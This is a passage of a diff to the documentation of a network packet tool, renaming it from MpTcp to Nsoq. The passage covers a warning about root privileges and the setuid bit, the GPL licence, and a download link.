-   MpTcp need superuser privileges (root) for operation and execution. DO NOT
+   Nsoq needs superuser privileges (root) for operation and execution. DO NOT
    use the stick bit to allow root privilegies. This is not recommended and
-   may allow involuntary or agressive DoS/DDoS attacks. The privileged MpTcp
+   may allow involuntary or agressive DoS/DDoS attacks. The privileged Nsoq
    use also allows users manipulate the ARP cache table of neighbors on
    network, or put the system over a remote control.
 
@@ -906,11 +913,13 @@ ______________________________________________________________________________
 DISPONIBILITY:
 ______________
 
-   MpTcp is available to anyone who wants to know, manipulate, or disassembly
-   the tool. MpTcp is licensed under GPL and Free Software Foundation. A copy
+   Nsoq is available to anyone who wants to know, manipulate, or disassembly
+   the tool. Nsoq is licensed under GPL and Free Software Foundation. A copy
    of the license accompanies the software. 
    Licensed under GPL 3 - Copyright (C) Felipe Ecker.
-   MpTcp can be freely downloaded here: www.hexcodes.org/tools/mptcp/downloads/
+
+   Nsoq can be freely downloaded here: 
+   www.hexcodes.org/tools/nsoq/downloads/
 
                                   Thank you.
 
